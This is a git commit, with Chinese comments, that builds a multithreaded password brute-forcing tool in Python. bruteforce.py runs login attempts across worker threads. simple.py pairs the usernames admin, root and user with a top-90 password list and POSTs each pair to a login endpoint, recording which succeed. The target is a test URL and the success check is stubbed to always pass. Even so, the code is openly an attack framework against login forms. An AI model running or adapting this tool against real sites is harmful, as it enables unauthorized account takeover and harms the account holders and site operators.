e72edf439d15d6fee625c185c055269ed15d8676
yuyu <iansmith@qq.com>
2019-10-24 23:05:49 +0800

    最简单的写完了，框架搞定

--- bruteforce.py
+++ bruteforce.py
@@ -1,23 +1,48 @@
-import requests
+from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from queue import Queue
 
+success_queue = Queue()  # 存储成功爆破的密码
+dict_queue = Queue()  # 存储字典队列
 
-def multi_thread_request(fun, dic: Queue, result: Queue, t=2):
+
+def multi_thread_request(fun, thread_num: int):
     """
-
-    :param fun: 登录函数
-    :param dic: 字典
-    :param result: 结果队列
-    :param t: 线程数量
-    :return: 爆破结果
+    多线程爆破
+    :param fun:
+    :param thread_num:
+    :return:
     """
-    pool = ThreadPoolExecutor(t)
-    l = []
-    for i in range(t):
-        pass
+    pool = ThreadPoolExecutor(thread_num)
+    pool_queue = []
+    for i in range(thread_num):
+        pool_queue.append(pool.submit(fun, ))
 
-    pass
+    return pool_queue
 
 
+def bruteforce(fun, thread_num: int):
+    """
+    直接开干
+    :param fun:
+    :param thread_num:
+    :return:
+    """
+    start_time = datetime.now()
+    count = 0
+    print("{} 开始爆破，设定线程 {}".format(start_time, thread_num))
+    try:
+        while not dict_queue.empty():
+            pool_queue = multi_thread_request(fun, thread_num=thread_num)
+
+            # 阻塞等待，不要让线程过多
+            count += thread_num
+            r = [t.result() for t in pool_queue]
+
+    except KeyboardInterrupt:
+        print("用户停止程序，程序运行时间{}, 运行次数 {} ".format(datetime.now() - start_time, count))
+        success = []
+        while not success_queue.empty():
+            success.append(success_queue.get())
+        print(success)
 
--- simple.py
+++ simple.py
@@ -1,29 +1,54 @@
-from bruteforce import multi_thread_request
-import queue
+from queue import Queue
+import requests
 
-q = queue.Queue(10)
+from bruteforce import multi_thread_request, bruteforce, success_queue, dict_queue
 
 
-def login(username, password) -> dict:
+def login():
     """
-    登录和检测登录结果的代码分别完成
-    :param username:
-    :param password:
+    登录和检测登录结果的代码针对每个网站分别完成
+    login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
     :return:
     """
-    success = True
-    msg = "admin:123456"
-
-    return {
-        "success": success,
-        "msg": msg
+    login_info = dict_queue.get()
+    username = login_info[0]
+    password = login_info[1]
+    payload = {
+        "username": username,
+        "password": password
     }
+    r = requests.post("https://httpbin.org/post", data=payload)
+    # 判断是否登录成功
+    # print(r.text)
+    if True:
+    # if r.status_code == 302:  # 根据实际情况修改此处，判定登录成功
+        msg = login_info
+        # 登录成功则把登录信息保存到success_queue
+        success_queue.put(msg)
+    else:
+        pass
+
+
+def get_dict() -> Queue:
+    """
+    生成字典队列
+    :return:
+    """
+    with open("dict/top_90.txt") as f:
+        passwords = f.readlines()
+
+    passwords = [line.strip() for line in passwords]
+
+    username = ['admin', 'root', 'user']
+
+    for u in username:
+        for p in passwords:
+            pair = (u, p)
+            dict_queue.put(pair)
+
+    return dict_queue
 
 
 if __name__ == "__main__":
-    result = queue.Queue()
-    dic = dict()
-    try:
-        multi_thread_request(login, dic=dic, result=result, t=10)
-    except KeyboardInterrupt:
-        print(result)
+    get_dict()
+    bruteforce(login, thread_num=3)
